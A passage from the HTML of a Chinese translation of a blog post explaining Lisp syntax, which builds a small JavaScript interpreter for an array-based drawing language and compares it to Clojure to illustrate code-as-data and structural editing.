      <span class="syntax-symbol">variables</span><span class="syntax-open">[</span><span class="syntax-symbol">name</span><span class="syntax-close">]</span> <span class="syntax-operator">=</span> <span class="syntax-symbol">v</span><span class="syntax-operator">;</span>
    <span class="syntax-close">}</span><span class="syntax-operator">,</span>
  <span class="syntax-close">}</span><span class="syntax-operator">;</span>
  <span class="syntax-special">const</span> <span class="syntax-symbol">mapArgsWithValues</span> <span class="syntax-operator">=</span> <span class="syntax-open">(</span><span class="syntax-symbol">args</span><span class="syntax-operator">,</span> <span class="syntax-symbol">values</span><span class="syntax-close">)</span> <span class="syntax-operator">=</span><span class="syntax-operator">&gt;</span> <span class="syntax-open">{</span>
    <span class="syntax-special">return</span> <span class="syntax-symbol">args</span><span class="syntax-operator">.</span><span class="syntax-symbol">reduce</span><span class="syntax-open">(</span><span class="syntax-open">(</span><span class="syntax-symbol">res</span><span class="syntax-operator">,</span> <span class="syntax-symbol">k</span><span class="syntax-operator">,</span> <span class="syntax-symbol">idx</span><span class="syntax-close">)</span> <span class="syntax-operator">=</span><span class="syntax-operator">&gt;</span> <span class="syntax-open">{</span>
      <span class="syntax-symbol">res</span><span class="syntax-open">[</span><span class="syntax-symbol">k</span><span class="syntax-close">]</span> <span class="syntax-operator">=</span> <span class="syntax-symbol">values</span><span class="syntax-open">[</span><span class="syntax-symbol">idx</span><span class="syntax-close">]</span><span class="syntax-operator">;</span>
      <span class="syntax-special">return</span> <span class="syntax-symbol">res</span><span class="syntax-operator">;</span>
    <span class="syntax-close">}</span><span class="syntax-operator">,</span> <span class="syntax-open">{</span><span class="syntax-close">}</span><span class="syntax-close">)</span><span class="syntax-operator">;</span>
  <span class="syntax-close">}</span><span class="syntax-operator">;</span>
  <span class="syntax-special">const</span> <span class="syntax-symbol">parseFnInstruction</span> <span class="syntax-operator">=</span> <span class="syntax-open">(</span><span class="syntax-symbol">args</span><span class="syntax-operator">,</span> <span class="syntax-symbol">body</span><span class="syntax-operator">,</span> <span class="syntax-symbol">oldVariables</span><span class="syntax-close">)</span> <span class="syntax-operator">=</span><span class="syntax-operator">&gt;</span> <span class="syntax-open">{</span>
    <span class="syntax-special">return</span> <span class="syntax-open">(</span><span class="syntax-operator">...</span><span class="syntax-symbol">values</span><span class="syntax-close">)</span> <span class="syntax-operator">=</span><span class="syntax-operator">&gt;</span> <span class="syntax-open">{</span>
      <span class="syntax-special">const</span> <span class="syntax-symbol">newVariables</span> <span class="syntax-operator">=</span> <span class="syntax-open">{</span>
        <span class="syntax-operator">...</span><span class="syntax-symbol">oldVariables</span><span class="syntax-operator">,</span>
        <span class="syntax-operator">...</span><span class="syntax-symbol">mapArgsWithValues</span><span class="syntax-open">(</span><span class="syntax-symbol">args</span><span class="syntax-operator">,</span> <span class="syntax-symbol">values</span><span class="syntax-close">)</span><span class="syntax-operator">,</span>
      <span class="syntax-close">}</span><span class="syntax-operator">;</span>
      <span class="syntax-special">return</span> <span class="syntax-symbol">parseInstruction</span><span class="syntax-open">(</span><span class="syntax-symbol">body</span><span class="syntax-operator">,</span> <span class="syntax-symbol">newVariables</span><span class="syntax-close">)</span><span class="syntax-operator">;</span>
    <span class="syntax-close">}</span><span class="syntax-operator">;</span>
  <span class="syntax-close">}</span><span class="syntax-operator">;</span>
  <span class="syntax-special">const</span> <span class="syntax-symbol">parseInstruction</span> <span class="syntax-operator">=</span> <span class="syntax-open">(</span><span class="syntax-symbol">ins</span><span class="syntax-operator">,</span> <span class="syntax-symbol">variables</span><span class="syntax-close">)</span> <span class="syntax-operator">=</span><span class="syntax-operator">&gt;</span> <span class="syntax-open">{</span>
    <span class="syntax-special">if</span> <span class="syntax-open">(</span><span class="syntax-symbol">variables</span><span class="syntax-open">[</span><span class="syntax-symbol">ins</span><span class="syntax-close">]</span><span class="syntax-close">)</span> <span class="syntax-open">{</span>
      <span class="syntax-comment">// 这里就对应着变量例如 &quot;shape&quot;
</span>      <span class="syntax-special">return</span> <span class="syntax-symbol">variables</span><span class="syntax-open">[</span><span class="syntax-symbol">ins</span><span class="syntax-close">]</span><span class="syntax-operator">;</span>
    <span class="syntax-close">}</span>
    <span class="syntax-special">if</span> <span class="syntax-open">(</span><span class="syntax-operator">!</span><span class="syntax-keyword">Array</span><span class="syntax-operator">.</span><span class="syntax-symbol">isArray</span><span class="syntax-open">(</span><span class="syntax-symbol">ins</span><span class="syntax-close">)</span><span class="syntax-close">)</span> <span class="syntax-open">{</span>
      <span class="syntax-comment">// 这里是原始的参数例如： {x: 0, y: 0}
</span>      <span class="syntax-special">return</span> <span class="syntax-symbol">ins</span><span class="syntax-operator">;</span>
    <span class="syntax-close">}</span>
    <span class="syntax-special">const</span> <span class="syntax-open">[</span><span class="syntax-symbol">fName</span><span class="syntax-operator">,</span> <span class="syntax-operator">...</span><span class="syntax-symbol">args</span><span class="syntax-close">]</span> <span class="syntax-operator">=</span> <span class="syntax-symbol">ins</span><span class="syntax-operator">;</span>
    <span class="syntax-special">if</span> <span class="syntax-open">(</span><span class="syntax-symbol">fName</span> <span class="syntax-operator">==</span> <span class="syntax-string">&quot;fn&quot;</span><span class="syntax-close">)</span> <span class="syntax-open">{</span>
      <span class="syntax-special">return</span> <span class="syntax-symbol">parseFnInstruction</span><span class="syntax-open">(</span><span class="syntax-operator">...</span><span class="syntax-symbol">args</span><span class="syntax-operator">,</span> <span class="syntax-symbol">variables</span><span class="syntax-close">)</span><span class="syntax-operator">;</span>
    <span class="syntax-close">}</span>
    <span class="syntax-special">const</span> <span class="syntax-symbol">fn</span> <span class="syntax-operator">=</span> <span class="syntax-symbol">fns</span><span class="syntax-open">[</span><span class="syntax-symbol">fName</span><span class="syntax-close">]</span> <span class="syntax-operator">||</span> <span class="syntax-symbol">variables</span><span class="syntax-open">[</span><span class="syntax-symbol">fName</span><span class="syntax-close">]</span><span class="syntax-operator">;</span>
    <span class="syntax-special">return</span> <span class="syntax-symbol">fn</span><span class="syntax-open">(</span><span class="syntax-operator">...</span><span class="syntax-symbol">args</span><span class="syntax-operator">.</span><span class="syntax-symbol">map</span><span class="syntax-open">(</span><span class="syntax-open">(</span><span class="syntax-symbol">arg</span><span class="syntax-close">)</span> <span class="syntax-operator">=</span><span class="syntax-operator">&gt;</span> <span class="syntax-symbol">parseInstruction</span><span class="syntax-open">(</span><span class="syntax-symbol">arg</span><span class="syntax-operator">,</span> <span class="syntax-symbol">variables</span><span class="syntax-close">)</span><span class="syntax-close">)</span><span class="syntax-close">)</span><span class="syntax-operator">;</span>
  <span class="syntax-close">}</span><span class="syntax-operator">;</span>
  <span class="syntax-symbol">parseInstruction</span><span class="syntax-open">(</span><span class="syntax-symbol">instruction</span><span class="syntax-operator">,</span> <span class="syntax-symbol">variables</span><span class="syntax-close">)</span><span class="syntax-operator">;</span>
<span class="syntax-close">}</span><span class="syntax-close">)</span></code></pre><p>天啊，就凭这些代码我们就能解析这些：</p><pre><code><span class="syntax-open">[</span>
  <span class="syntax-string">&quot;do&quot;</span><span class="syntax-operator">,</span>
  <span class="syntax-open">[</span>
    <span class="syntax-string">&quot;def&quot;</span><span class="syntax-operator">,</span>
    <span class="syntax-string">&quot;drawTriangle&quot;</span><span class="syntax-operator">,</span>
    <span class="syntax-open">[</span>
      <span class="syntax-string">&quot;fn&quot;</span><span class="syntax-operator">,</span>
      <span class="syntax-open">[</span><span class="syntax-string">&quot;left&quot;</span><span class="syntax-operator">,</span> <span class="syntax-string">&quot;top&quot;</span><span class="syntax-operator">,</span> <span class="syntax-string">&quot;right&quot;</span><span class="syntax-operator">,</span> <span class="syntax-string">&quot;color&quot;</span><span class="syntax-close">]</span><span class="syntax-operator">,</span>
      <span class="syntax-open">[</span>
        <span class="syntax-string">&quot;do&quot;</span><span class="syntax-operator">,</span>
        <span class="syntax-open">[</span><span class="syntax-string">&quot;drawLine&quot;</span><span class="syntax-operator">,</span> <span class="syntax-string">&quot;left&quot;</span><span class="syntax-operator">,</span> <span class="syntax-string">&quot;top&quot;</span><span class="syntax-operator">,</span> <span class="syntax-string">&quot;color&quot;</span><span class="syntax-close">]</span><span class="syntax-operator">,</span>
        <span class="syntax-open">[</span><span class="syntax-string">&quot;drawLine&quot;</span><span class="syntax-operator">,</span> <span class="syntax-string">&quot;top&quot;</span><span class="syntax-operator">,</span> <span class="syntax-string">&quot;right&quot;</span><span class="syntax-operator">,</span> <span class="syntax-string">&quot;color&quot;</span><span class="syntax-close">]</span><span class="syntax-operator">,</span>
        <span class="syntax-open">[</span><span class="syntax-string">&quot;drawLine&quot;</span><span class="syntax-operator">,</span> <span class="syntax-string">&quot;left&quot;</span><span class="syntax-operator">,</span> <span class="syntax-string">&quot;right&quot;</span><span class="syntax-operator">,</span> <span class="syntax-string">&quot;color&quot;</span><span class="syntax-close">]</span><span class="syntax-operator">,</span>
      <span class="syntax-close">]</span><span class="syntax-operator">,</span>
    <span class="syntax-close">]</span><span class="syntax-operator">,</span>
  <span class="syntax-close">]</span><span class="syntax-operator">,</span>
  <span class="syntax-open">[</span><span class="syntax-string">&quot;drawTriangle&quot;</span><span class="syntax-operator">,</span> <span class="syntax-open">{</span> <span class="syntax-symbol">x</span><span class="syntax-operator">:</span> <span class="syntax-symbol">0</span><span class="syntax-operator">,</span> <span class="syntax-symbol">y</span><span class="syntax-operator">:</span> <span class="syntax-symbol">0</span> <span class="syntax-close">}</span><span class="syntax-operator">,</span> <span class="syntax-open">{</span> <span class="syntax-symbol">x</span><span class="syntax-operator">:</span> <span class="syntax-symbol">3</span><span class="syntax-operator">,</span> <span class="syntax-symbol">y</span><span class="syntax-operator">:</span> <span class="syntax-symbol">3</span> <span class="syntax-close">}</span><span class="syntax-operator">,</span> <span class="syntax-open">{</span> <span class="syntax-symbol">x</span><span class="syntax-operator">:</span> <span class="syntax-symbol">6</span><span class="syntax-operator">,</span> <span class="syntax-symbol">y</span><span class="syntax-operator">:</span> <span class="syntax-symbol">0</span> <span class="syntax-close">}</span><span class="syntax-operator">,</span> <span class="syntax-string">&quot;blue&quot;</span><span class="syntax-close">]</span><span class="syntax-operator">,</span>
  <span class="syntax-open">[</span><span class="syntax-string">&quot;drawTriangle&quot;</span><span class="syntax-operator">,</span> <span class="syntax-open">{</span> <span class="syntax-symbol">x</span><span class="syntax-operator">:</span> <span class="syntax-symbol">6</span><span class="syntax-operator">,</span> <span class="syntax-symbol">y</span><span class="syntax-operator">:</span> <span class="syntax-symbol">6</span> <span class="syntax-close">}</span><span class="syntax-operator">,</span> <span class="syntax-open">{</span> <span class="syntax-symbol">x</span><span class="syntax-operator">:</span> <span class="syntax-symbol">10</span><span class="syntax-operator">,</span> <span class="syntax-symbol">y</span><span class="syntax-operator">:</span> <span class="syntax-symbol">10</span> <span class="syntax-close">}</span><span class="syntax-operator">,</span> <span class="syntax-open">{</span> <span class="syntax-symbol">x</span><span class="syntax-operator">:</span> <span class="syntax-symbol">6</span><span class="syntax-operator">,</span> <span class="syntax-symbol">y</span><span class="syntax-operator">:</span> <span class="syntax-symbol">16</span> <span class="syntax-close">}</span><span class="syntax-operator">,</span> <span class="syntax-string">&quot;purple&quot;</span><span class="syntax-close">]</span><span class="syntax-operator">,</span>
<span class="syntax-close">]</span><span class="syntax-close">)</span></code></pre><p>我们可以组合函数、定义变量甚至创建自己的函数。仔细想想，我们刚刚相当于创建了一门新的编程语言！ <sup><a href="#1" id="1r">1</a></sup></p><h2 id="试试看">试试看</h2><p>这是一个绘制三角形的例子 🙂</p><p><a href="https://jsfiddle.net/xn3tkdhL/3/" class="external_link">Edit fiddle - JSFiddle - Code Playground</a></p><p>和一个快乐的小人的例子</p><p><a href="https://jsfiddle.net/xn3tkdhL/2/" class="external_link">Edit fiddle - JSFiddle - Code Playground</a></p><h2 id="惊喜">惊喜</h2><p>我们甚至还能发现一些有趣的东西，我们新的编程语言比起 Javascript 还有一些优点！</p><h3 id="没什么特别的">没什么特别的</h3><p>在 Javascript 中，你通过写下 const x = foo 来定义变量，如果你想重写 <code>const</code> 例如写成 <code>c</code> 是办不到的，
因为 const x = foo 是一个 Javascript 中的特殊语法，你无法改变它。</p><p>但在我们的数组语言里，根本没什么语法！一切都只是数组。我们可以轻易写出特殊的类似 <code>def</code> 一样的 <code>c</code> 指令。</p><p>仔细想想看，在 Javascript 中我们类似于客人，我们得遵循语言设计者的规则。但在我们的数组语言里，我们是「共同所有者」，
语言设计者的「内置」内容（例如 &quot;def&quot; &quot;fn&quot;）和我们写下的（例如 &quot;drawTriangle&quot;）没什么太大区别！</p><h3 id="数据即代码">数据即代码</h3><p>还有一个更大的优点。我们的代码只是一大堆数组，所以我们能对这些代码做点事情，我们可以写生成代码的代码！</p><p>例如，如果我们想在 Javascript 里支持 <code>unless</code> ：</p><p>当有人写下</p><pre><code><span class="syntax-symbol">unless</span> <span class="syntax-symbol">foo</span> <span class="syntax-open">{</span>
   <span class="syntax-operator">...</span>
<span class="syntax-close">}</span></code></pre><p>我们要将其重写成</p><pre><code><span class="syntax-special">if</span> <span class="syntax-operator">!</span><span class="syntax-symbol">foo</span> <span class="syntax-open">{</span>
   <span class="syntax-operator">...</span>
<span class="syntax-close">}</span></code></pre><p>这很难做到，可能需要类似 Babel 这类的工具解析文件确保能在 AST 之上将代码安全地重写成</p><pre><code><span class="syntax-special">if</span> <span class="syntax-operator">!</span><span class="syntax-symbol">foo</span> <span class="syntax-open">{</span>
  <span class="syntax-operator">...</span>
<span class="syntax-close">}</span></code></pre><p>但在我们的数组语言里，代码就是数组！很容易将其重写成 <code>unless</code> ：</p><pre><code><span class="syntax-special">function</span> <span class="syntax-symbol">rewriteUnless</span><span class="syntax-open">(</span><span class="syntax-symbol">unlessCode</span><span class="syntax-close">)</span> <span class="syntax-open">{</span>
   <span class="syntax-special">const</span> <span class="syntax-open">[</span><span class="syntax-symbol">_unlessInstructionName</span><span class="syntax-operator">,</span> <span class="syntax-symbol">testCondition</span><span class="syntax-operator">,</span> <span class="syntax-symbol">consequent</span><span class="syntax-close">]</span> <span class="syntax-operator">=</span> <span class="syntax-symbol">unlessCode</span><span class="syntax-operator">;</span> 
   <span class="syntax-special">return</span> <span class="syntax-open">[</span><span class="syntax-string">&quot;if&quot;</span><span class="syntax-operator">,</span> <span class="syntax-open">[</span><span class="syntax-string">&quot;not&quot;</span><span class="syntax-operator">,</span> <span class="syntax-symbol">testCondition</span><span class="syntax-close">]</span><span class="syntax-operator">,</span> <span class="syntax-symbol">consequent</span><span class="syntax-close">]</span>
<span class="syntax-close">}</span></code></pre><pre><code><span class="syntax-symbol">rewriteUnless</span><span class="syntax-open">(</span><span class="syntax-open">[</span><span class="syntax-string">&quot;unless&quot;</span><span class="syntax-operator">,</span> <span class="syntax-open">[</span><span class="syntax-string">&quot;=&quot;</span><span class="syntax-operator">,</span> <span class="syntax-symbol">1</span><span class="syntax-operator">,</span> <span class="syntax-symbol">1</span><span class="syntax-close">]</span><span class="syntax-operator">,</span> <span class="syntax-open">[</span><span class="syntax-string">&quot;drawLine&quot;</span><span class="syntax-close">]</span><span class="syntax-close">]</span><span class="syntax-close">)</span>
<span class="syntax-comment">// =&gt;
</span><span class="syntax-open">[</span><span class="syntax-string">&quot;if&quot;</span><span class="syntax-operator">,</span> <span class="syntax-open">[</span><span class="syntax-string">&quot;not&quot;</span><span class="syntax-operator">,</span> <span class="syntax-open">[</span><span class="syntax-string">&quot;=&quot;</span><span class="syntax-operator">,</span> <span class="syntax-symbol">1</span><span class="syntax-operator">,</span> <span class="syntax-symbol">1</span><span class="syntax-close">]</span><span class="syntax-close">]</span><span class="syntax-operator">,</span> <span class="syntax-open">[</span><span class="syntax-string">&quot;drawLine&quot;</span><span class="syntax-close">]</span><span class="syntax-close">]</span><span class="syntax-operator">;</span></code></pre><p>天哪，小菜一碟。</p><h2 id="结构编辑">结构编辑</h2><p>用数据表示你的代码不仅让你容易操作你的代码也同时让你能够轻松编辑。例如
假设现在你在编辑这段代码：</p><pre><code><span class="syntax-open">[</span><span class="syntax-string">&quot;if&quot;</span><span class="syntax-operator">,</span> <span class="syntax-symbol">testCondition</span><span class="syntax-operator">,</span> <span class="syntax-symbol">consequent</span><span class="syntax-close">]</span></code></pre><p>你想把 <code>testCondition</code> 换成 <code>[&quot;not&quot;, testCondition]</code></p><p>你可以把光标移动到 <code>testCondition</code></p><pre><code><span class="syntax-open">[</span><span class="syntax-string">&quot;if&quot;</span><span class="syntax-operator">,</span> <span class="syntax-operator">|</span><span class="syntax-symbol">testCondition</span><span class="syntax-operator">,</span> <span class="syntax-symbol">consequent</span><span class="syntax-close">]</span></code></pre><p>然后创建一个数组</p><pre><code><span class="syntax-open">[</span><span class="syntax-string">&quot;if&quot;</span><span class="syntax-operator">,</span> <span class="syntax-open">[</span><span class="syntax-operator">|</span><span class="syntax-close">]</span> <span class="syntax-symbol">testCondition</span><span class="syntax-operator">,</span> <span class="syntax-symbol">consequent</span><span class="syntax-close">]</span></code></pre><p>然后键入 &quot;not&quot;</p><pre><code><span class="syntax-open">[</span><span class="syntax-string">&quot;if&quot;</span><span class="syntax-operator">,</span> <span class="syntax-open">[</span><span class="syntax-string">&quot;not&quot;</span><span class="syntax-operator">,</span> <span class="syntax-operator">|</span><span class="syntax-close">]</span> <span class="syntax-symbol">testCondition</span><span class="syntax-operator">,</span> <span class="syntax-symbol">consequent</span><span class="syntax-close">]</span></code></pre><p>如果你在用的编辑器理解这些数组，你可以告诉它：「拓展」这个数组到右边：</p><pre><code><span class="syntax-open">[</span><span class="syntax-string">&quot;if&quot;</span><span class="syntax-operator">,</span> <span class="syntax-open">[</span><span class="syntax-string">&quot;not&quot;</span><span class="syntax-operator">,</span> <span class="syntax-symbol">testCondition</span><span class="syntax-close">]</span><span class="syntax-operator">,</span> <span class="syntax-symbol">consequent</span><span class="syntax-close">]</span></code></pre><p>嘣，你的编辑器就帮你修改了代码结构。</p><p>如果你想撤销这个操作，你可以把光标移动到 <code>testCondition</code> 旁</p><pre><code><span class="syntax-open">[</span><span class="syntax-string">&quot;if&quot;</span><span class="syntax-operator">,</span> <span class="syntax-open">[</span><span class="syntax-string">&quot;not&quot;</span><span class="syntax-operator">,</span> <span class="syntax-operator">|</span><span class="syntax-symbol">testCondition</span><span class="syntax-close">]</span><span class="syntax-operator">,</span> <span class="syntax-symbol">consequent</span><span class="syntax-close">]</span></code></pre><p>并请编辑器「提升」一个层级：</p><pre><code><span class="syntax-open">[</span><span class="syntax-string">&quot;if&quot;</span><span class="syntax-operator">,</span> <span class="syntax-symbol">testCondition</span><span class="syntax-operator">,</span> <span class="syntax-symbol">consequent</span><span class="syntax-close">]</span></code></pre><p>突然间，与其说是在编辑字符不说说是在操作代码结构。这就叫做结构编辑 <sup><a href="#2" id="2r">2</a></sup> 。这让你拥有陶艺家般的速度，这也是将代码
当作数据的众多好处之一。</p><h2 id="你发现了什么">你发现了什么</h2><p>嗯，我们写出的数组语言……只是一个实现不佳的 Lisp 方言！</p><p>我们这个最复杂的例子：</p><pre><code><span class="syntax-open">[</span>
  <span class="syntax-string">&quot;do&quot;</span><span class="syntax-operator">,</span>
  <span class="syntax-open">[</span>
    <span class="syntax-string">&quot;def&quot;</span><span class="syntax-operator">,</span>
    <span class="syntax-string">&quot;drawTriangle&quot;</span><span class="syntax-operator">,</span>
    <span class="syntax-open">[</span>
      <span class="syntax-string">&quot;fn&quot;</span><span class="syntax-operator">,</span>
      <span class="syntax-open">[</span><span class="syntax-string">&quot;left&quot;</span><span class="syntax-operator">,</span> <span class="syntax-string">&quot;top&quot;</span><span class="syntax-operator">,</span> <span class="syntax-string">&quot;right&quot;</span><span class="syntax-operator">,</span> <span class="syntax-string">&quot;color&quot;</span><span class="syntax-close">]</span><span class="syntax-operator">,</span>
      <span class="syntax-open">[</span>
        <span class="syntax-string">&quot;do&quot;</span><span class="syntax-operator">,</span>
        <span class="syntax-open">[</span><span class="syntax-string">&quot;drawLine&quot;</span><span class="syntax-operator">,</span> <span class="syntax-string">&quot;left&quot;</span><span class="syntax-operator">,</span> <span class="syntax-string">&quot;top&quot;</span><span class="syntax-operator">,</span> <span class="syntax-string">&quot;color&quot;</span><span class="syntax-close">]</span><span class="syntax-operator">,</span>
        <span class="syntax-open">[</span><span class="syntax-string">&quot;drawLine&quot;</span><span class="syntax-operator">,</span> <span class="syntax-string">&quot;top&quot;</span><span class="syntax-operator">,</span> <span class="syntax-string">&quot;right&quot;</span><span class="syntax-operator">,</span> <span class="syntax-string">&quot;color&quot;</span><span class="syntax-close">]</span><span class="syntax-operator">,</span>
        <span class="syntax-open">[</span><span class="syntax-string">&quot;drawLine&quot;</span><span class="syntax-operator">,</span> <span class="syntax-string">&quot;left&quot;</span><span class="syntax-operator">,</span> <span class="syntax-string">&quot;right&quot;</span><span class="syntax-operator">,</span> <span class="syntax-string">&quot;color&quot;</span><span class="syntax-close">]</span><span class="syntax-operator">,</span>
      <span class="syntax-close">]</span><span class="syntax-operator">,</span>
    <span class="syntax-close">]</span><span class="syntax-operator">,</span>
  <span class="syntax-close">]</span><span class="syntax-operator">,</span>
  <span class="syntax-open">[</span><span class="syntax-string">&quot;drawTriangle&quot;</span><span class="syntax-operator">,</span> <span class="syntax-open">{</span> <span class="syntax-symbol">x</span><span class="syntax-operator">:</span> <span class="syntax-symbol">0</span><span class="syntax-operator">,</span> <span class="syntax-symbol">y</span><span class="syntax-operator">:</span> <span class="syntax-symbol">0</span> <span class="syntax-close">}</span><span class="syntax-operator">,</span> <span class="syntax-open">{</span> <span class="syntax-symbol">x</span><span class="syntax-operator">:</span> <span class="syntax-symbol">3</span><span class="syntax-operator">,</span> <span class="syntax-symbol">y</span><span class="syntax-operator">:</span> <span class="syntax-symbol">3</span> <span class="syntax-close">}</span><span class="syntax-operator">,</span> <span class="syntax-open">{</span> <span class="syntax-symbol">x</span><span class="syntax-operator">:</span> <span class="syntax-symbol">6</span><span class="syntax-operator">,</span> <span class="syntax-symbol">y</span><span class="syntax-operator">:</span> <span class="syntax-symbol">0</span> <span class="syntax-close">}</span><span class="syntax-operator">,</span> <span class="syntax-string">&quot;blue&quot;</span><span class="syntax-close">]</span><span class="syntax-operator">,</span>
  <span class="syntax-open">[</span><span class="syntax-string">&quot;drawTriangle&quot;</span><span class="syntax-operator">,</span> <span class="syntax-open">{</span> <span class="syntax-symbol">x</span><span class="syntax-operator">:</span> <span class="syntax-symbol">6</span><span class="syntax-operator">,</span> <span class="syntax-symbol">y</span><span class="syntax-operator">:</span> <span class="syntax-symbol">6</span> <span class="syntax-close">}</span><span class="syntax-operator">,</span> <span class="syntax-open">{</span> <span class="syntax-symbol">x</span><span class="syntax-operator">:</span> <span class="syntax-symbol">10</span><span class="syntax-operator">,</span> <span class="syntax-symbol">y</span><span class="syntax-operator">:</span> <span class="syntax-symbol">10</span> <span class="syntax-close">}</span><span class="syntax-operator">,</span> <span class="syntax-open">{</span> <span class="syntax-symbol">x</span><span class="syntax-operator">:</span> <span class="syntax-symbol">6</span><span class="syntax-operator">,</span> <span class="syntax-symbol">y</span><span class="syntax-operator">:</span> <span class="syntax-symbol">16</span> <span class="syntax-close">}</span><span class="syntax-operator">,</span> <span class="syntax-string">&quot;purple&quot;</span><span class="syntax-close">]</span><span class="syntax-operator">,</span>
<span class="syntax-close">]</span><span class="syntax-close">)</span></code></pre><p>用 Clojure （另一种 lisp 方言）写出来是这样的：</p><pre><code><span class="syntax-open">(</span><span class="syntax-special">do</span>
  <span class="syntax-open">(</span><span class="syntax-special">def</span> <span class="syntax-symbol">draw-triangle</span> <span class="syntax-open">(</span><span class="syntax-special">fn</span> <span class="syntax-open">[</span><span class="syntax-symbol">left</span> <span class="syntax-symbol">top</span> <span class="syntax-symbol">right</span> <span class="syntax-symbol">color</span><span class="syntax-close">]</span>
                       <span class="syntax-open">(</span><span class="syntax-symbol">draw-line</span> <span class="syntax-symbol">left</span> <span class="syntax-symbol">top</span> <span class="syntax-symbol">color</span><span class="syntax-close">)</span>
                       <span class="syntax-open">(</span><span class="syntax-symbol">draw-line</span> <span class="syntax-symbol">top</span> <span class="syntax-symbol">right</span> <span class="syntax-symbol">color</span><span class="syntax-close">)</span>
                       <span class="syntax-open">(</span><span class="syntax-symbol">draw-line</span> <span class="syntax-symbol">left</span> <span class="syntax-symbol">right</span> <span class="syntax-symbol">color</span><span class="syntax-close">)</span><span class="syntax-close">)</span><span class="syntax-close">)</span>
  <span class="syntax-open">(</span><span class="syntax-symbol">draw-triangle</span> <span class="syntax-open">{</span><span class="syntax-keyword">:x</span> <span class="syntax-symbol">0</span> <span class="syntax-keyword">:y</span> <span class="syntax-symbol">0</span><span class="syntax-close">}</span> <span class="syntax-open">{</span><span class="syntax-keyword">:x</span> <span class="syntax-symbol">3</span> <span class="syntax-keyword">:y</span> <span class="syntax-symbol">3</span><span class="syntax-close">}</span> <span class="syntax-open">{</span><span class="syntax-keyword">:x</span> <span class="syntax-symbol">6</span> <span class="syntax-keyword">:y</span> <span class="syntax-symbol">0</span><span class="syntax-close">}</span> <span class="syntax-string">&quot;blue&quot;</span><span class="syntax-close">)</span>
  <span class="syntax-open">(</span><span class="syntax-symbol">draw-triangle</span> <span class="syntax-open">{</span><span class="syntax-keyword">:x</span> <span class="syntax-symbol">6</span> <span class="syntax-keyword">:y</span> <span class="syntax-symbol">6</span><span class="syntax-close">}</span> <span class="syntax-open">{</span><span class="syntax-keyword">:x</span> <span class="syntax-symbol">10</span> <span class="syntax-keyword">:y</span> <span class="syntax-symbol">10</span><span class="syntax-close">}</span> <span class="syntax-open">{</span><span class="syntax-keyword">:x</span> <span class="syntax-symbol">6</span> <span class="syntax-keyword">:y</span> <span class="syntax-symbol">16</span><span class="syntax-close">}</span> <span class="syntax-string">&quot;purple&quot;</span><span class="syntax-close">)</span><span class="syntax-close">)</span></code></pre><p>表面上的区别在于：</p><ul><li>用 <code>()</code> 代替列表</li><li>移除了所有逗号</li><li>驼峰命名变成了短横线命名</li></ul><p>剩下的规则就差不多了：</p><pre><code><span class="syntax-open">(</span><span class="syntax-symbol">draw-line</span> <span class="syntax-symbol">left</span> <span class="syntax-symbol">top</span> <span class="syntax-symbol">color</span><span class="syntax-close">)</span></code></pre><p>意味者：</p><ul><li>对 <code>left</code>, <code>top</code>, <code>color</code> 求值，并用求出来的值替换它本身</li><li>将这些值带入到 <code>draw-line</code> 这个函数并执行</li></ul><h2 id="发现？">发现？</h2><p>现在如果我们认同操作源代码对我们很重要，那什么语言更方便让我们操作呢？</p><p>换个说法说：如何让我们的代码像代码里的数据一样直观？一个想法很快就会浮现：让代码既是数据！
多么激动的结论。如果我们关心操作源代码，那么一个自然而言的答案就是：代码既数据 <sup><a href="#3" id="3r">3</a></sup> 。</p><p>如果代码即数据，那么我们可以用什么样的数据来表现？XML 可以，JSON 也可以，但如果我们往下找到最简单的数据结构
会发生什么？这会导向最简单的嵌套结构……列表！</p><p>这让人发人深省又激动人心。</p><p>发人深省在于，感觉 Lisp 像是被「发现」的。像是什么最优化问题的解一样：如果你关心操作代码，
你就会像发现万有引力一样发现 Lisp 。用一种发现出来的工具有点令人心生敬畏：或许某些天外生命就在用着 Lisp ！</p><p>激动人心在于，可能有更好的语法在这，谁知道呢。Ruby 和 Python 是某种实验，尝试在没有括号的情况下带来类似 Lisp 般的力量。我
觉得这个问题还没有解决。也许你，可以考虑一下。🙂</p><h2 id="结尾">结尾</h2><p>想象一下如果你能重写所用语言的代码，你的表现力会有多大。
你将和语言设计师站在同一水平，而你在这一层级编写的抽象，累积起来能让你少走数年的弯路。</p><p>突然间，那些括号看起来挺酷的！</p><h2 id="脚注">脚注</h2><p>感谢 Daniel Woelfel, Alex Kotliarskyi, Sean Grove, Joe Averbuk, Irakli Safareli 对本文草稿的审阅</p><p><sup><a href="#1r" id="1">1</a></sup> 当然，我们也可以用它写 <a href="https://stopa.io/post/263" class="external_link">Y 组合子</a> !</p><p><sup><a href="#2r" id="2">2</a></sup> Cursive 的文档里有一个<a href="https://cursive-ide.com/userguide/paredit.html" class="external_link">很棒的演示</a> 。</p><p><sup><a href="#3r" id="3">3</a></sup> 例如 JavaScript 里 <a href="https://www.sweetjs.org/doc/tutorial.html#sweet-let" class="external_link">sweet.js</a> 有在尝试支持宏。不过你可以看到在那里操作源代码仍然不如用代码当成数据来得直观。</p><p>译按：另一篇对此文章的翻译： <a href="https://southerncross.github.io/blog/2020/11/an-intuition-for-list-syntax.html" class="external_link">【译】Lisp语法的直观解释 | Lishunyang's Blog</a></p></div></div></main><div class="pagination"><a class="btn" href="/2025/12/traditional-craftsmanship-frontend/">← 上一页</a><a class="btn" href="/"> 主页 </a><a class="btn" href="/2025/12/fox-thinking-9/">下一页 →</a></div><div class="comment"><blockquote>如不想授权 Giscus 应用，也可以点击下方<strong>左上角数字</strong>直接跳转到 Github Discussions 进行评论。</blockquote><script src="https://giscus.app/client.js" data-repo="SouthFox-D/SouthFox-D.github.io" data-repo-id="MDEwOlJlcG9zaXRvcnkyMjg3NDM0MjQ=" data-category="博客评论" data-category-id="DIC_kwDODaJZAM4CA7bf" data-mapping="specific" data-term="2025/12/an-intuition-for-lisp-syntax-zh/" data-reactions-enabled="0" data-emit-metadata="0" data-input-position="top" data-theme="dark_dimmed" data-lang="zh-CN" data-loading="lazy" crossorigin="anonymous" async=""></script></div></div><div class="sidebar"><div class="widget"><h4>链接</h4><ul><li><a href="/friends/">友链</a></li><li><a href="https://www.travellings.cn/train.html">开往</a></li><li><a href="https://foreverblog.cn/go.html">虫洞</a></li><li><a href="/feed.xml">订阅（Atom)</a></li><li><a href="/rss2.xml">订阅（Rss)</a></li><li><a href="https://www.lisperati.com/logo.html"><img src="/assets/img/lisplogo_warning2_128.png" alt="Lisp logo warning" /></a></li><li><a href="https://www.fsf.org/appeal"><img 